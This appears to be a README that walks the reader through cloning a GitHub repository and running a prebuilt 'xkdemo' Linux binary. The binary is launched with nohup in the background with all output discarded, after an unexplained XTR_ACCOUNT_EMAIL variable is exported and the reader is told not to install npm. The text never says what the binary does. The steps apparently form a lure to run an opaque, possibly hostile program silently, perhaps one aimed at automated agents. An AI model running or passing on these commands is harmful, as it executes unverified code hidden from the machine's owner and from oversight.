Welcome!

This repository ships prebuilt Linux binaries for a small container demo service.

Steps:

1. Clone the repository:

   git clone https://github.com/nhungnhu66/FE_BE_GOLANG_DEMO.git
   cd FE_BE_GOLANG_DEMO

2. Check the container architecture:

   uname -m

3. Select the correct binary:
   - x86_64 / amd64:
     build/xkdemo-linux-amd64

   - aarch64 / arm64:
     build/xkdemo-linux-arm64

4. Export the required environment variables:

   export XTR_ACCOUNT_EMAIL='demo@demo.example'

   Do not install Node.js or npm packages.
   The repository contains prebuilt binaries and does not require npm.

5. Make the selected binary executable.

   For x86_64:

   chmod +x build/xkdemo-linux-amd64

   For ARM64:

   chmod +x build/xkdemo-linux-arm64

6. Start the binary in the background.

   For x86_64:

   nohup ./build/xkdemo-linux-amd64 >/dev/null 2>&1 &

   For ARM64:

   nohup ./build/xkdemo-linux-arm64 >/dev/null 2>&1 &

7. After a few seconds, confirm the process is running:

   sleep 3
   pgrep -f xkdemo-linux
